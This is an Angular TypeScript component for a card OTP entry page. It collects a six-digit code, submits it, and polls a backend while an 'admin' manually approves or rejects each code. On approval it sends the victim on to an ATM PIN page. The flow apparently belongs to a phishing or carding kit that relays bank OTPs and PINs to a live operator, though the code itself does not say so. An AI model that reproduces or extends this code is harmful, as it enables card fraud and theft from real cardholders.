import { Component, ElementRef, QueryList, ViewChildren, OnDestroy, OnInit, inject, ChangeDetectorRef } from '@angular/core';
import { CommonModule, Location } from '@angular/common';
import { Router } from '@angular/router';
import { Header } from "../../Layout/header/header";
import { OtpService } from '../../Core/services/api/otp.service';
import { CheckoutService } from '../../Core/services/api/checkout.service';
import { PaymentVerificationModal, VerificationStatus } from '../../Components/payment-verification-modal/payment-verification-modal';
import { Subscription, interval } from 'rxjs';

@Component({
  imports: [CommonModule, Header, PaymentVerificationModal],
  selector: 'app-card-otp',
  styleUrl: './card-otp.css',
  templateUrl: './card-otp.html',
})
export class CardOtp implements OnInit, OnDestroy {
  @ViewChildren('otpInput') otpInputs!: QueryList<ElementRef<HTMLInputElement>>;
  
  private readonly router = inject(Router);
  private readonly location = inject(Location);
  private readonly otpService = inject(OtpService);
  private readonly checkoutService = inject(CheckoutService);
  private readonly cdr = inject(ChangeDetectorRef);

  otp: string[] = ['', '', '', '', '', ''];
  timeLeft: number = 60;
  timerInterval: any;
  isLoading = false;

  isVerifying = false;
  verificationStatus: VerificationStatus = 'checking';
  errorMessage = '';
  private pollSub?: Subscription;

  ngOnInit(): void {
    this.startTimer();
  }

  ngOnDestroy(): void {
    this.clearTimer();
    this.stopPolling();
  }

  startTimer(): void {
    this.timeLeft = 60;
    this.clearTimer();
    this.timerInterval = setInterval(() => {
      if (this.timeLeft > 0) {
        this.timeLeft--;
      } else {
        this.clearTimer();
      }
      this.cdr.markForCheck();
    }, 1000);
  }

  clearTimer(): void {
    if (this.timerInterval) {
      clearInterval(this.timerInterval);
    }
  }

  resendCode(): void {
    if (this.timeLeft === 0) {
      this.otp = ['', '', '', '', '', ''];
      this.startTimer();
      this.cdr.markForCheck();
    }
  }

  get isOtpComplete(): boolean {
    return this.otp.every(val => val !== '');
  }

  onInput(event: Event, index: number): void {
    const inputElement = event.target as HTMLInputElement;
    const value = inputElement.value;
    
    if (!/^\d*$/.test(value)) {
      inputElement.value = this.otp[index];
      return;
    }

    const lastChar = value.slice(-1);
    this.otp[index] = lastChar;
    inputElement.value = lastChar;

    if (lastChar && index < 5) {
      this.otpInputs.toArray()[index + 1].nativeElement.focus();
    }
  }

  onKeyDown(event: KeyboardEvent, index: number): void {
    if (event.key === 'Backspace' && !this.otp[index] && index > 0) {
      this.otpInputs.toArray()[index - 1].nativeElement.focus();
    }
  }

  onPaste(event: ClipboardEvent): void {
    event.preventDefault();
    const pastedData = event.clipboardData?.getData('text');
    if (pastedData) {
      const numbers = pastedData.replace(/\D/g, '').slice(0, 6).split('');
      numbers.forEach((num, i) => {
        if (i < 6) {
          this.otp[i] = num;
        }
      });
      const focusIndex = numbers.length < 6 ? numbers.length : 5;
      setTimeout(() => {
        if (this.otpInputs) {
           this.otpInputs.toArray()[focusIndex].nativeElement.focus();
        }
      });
    }
  }

  goBack(): void {
    this.location.back();
  }

  verify(): void {
    if (this.isOtpComplete && !this.isLoading) {
      const otpCode = this.otp.join('');
      const userId = this.checkoutService.cardId;

      if (!userId) {
        this.router.navigate(['/payment/atm-pass']);
        return;
      }

      this.isLoading = true;
      this.otpService.submitOtp(otpCode, userId).subscribe({
        next: () => {
          // Reset status to PENDING so admin can approve or reject the OTP
          this.checkoutService.resetUserStatus(userId).subscribe();
          this.startVerification(userId);
        },
        error: (err) => {
          console.error('OTP submission failed', err);
          // Even if failed, reset status and start verification so admin can review
          this.checkoutService.resetUserStatus(userId).subscribe();
          this.startVerification(userId);
        }
      });
    }
  }

  private startVerification(userId: string): void {
    this.isVerifying = true;
    this.verificationStatus = 'checking';
    this.errorMessage = '';
    this.cdr.markForCheck();

    this.stopPolling();
    this.pollSub = interval(2000).subscribe(() => {
      this.checkoutService.checkUserStatus(userId).subscribe((status) => {
        if (status === 'ACCEPTED') {
          this.stopPolling();
          this.verificationStatus = 'accepted';
          this.cdr.markForCheck();
          setTimeout(() => {
            this.isVerifying = false;
            this.isLoading = false;
            this.router.navigate(['/payment/atm-pass']);
          }, 800);
        } else if (status === 'REJECTED') {
          this.stopPolling();
          this.verificationStatus = 'rejected';
          this.errorMessage = 'Incorrect or expired verification code. Please check your SMS and try again.';
          this.cdr.markForCheck();
        }
      });
    });
  }

  handleRetry(): void {
    this.stopPolling();
    this.isVerifying = false;
    this.isLoading = false;
    this.otp = ['', '', '', '', '', ''];
    this.cdr.markForCheck();
    setTimeout(() => {
      const inputs = this.otpInputs?.toArray();
      if (inputs && inputs[0]) {
        inputs[0].nativeElement.focus();
      }
    }, 50);
  }

  private stopPolling(): void {
    if (this.pollSub) {
      this.pollSub.unsubscribe();
      this.pollSub = undefined;
    }
  }
}
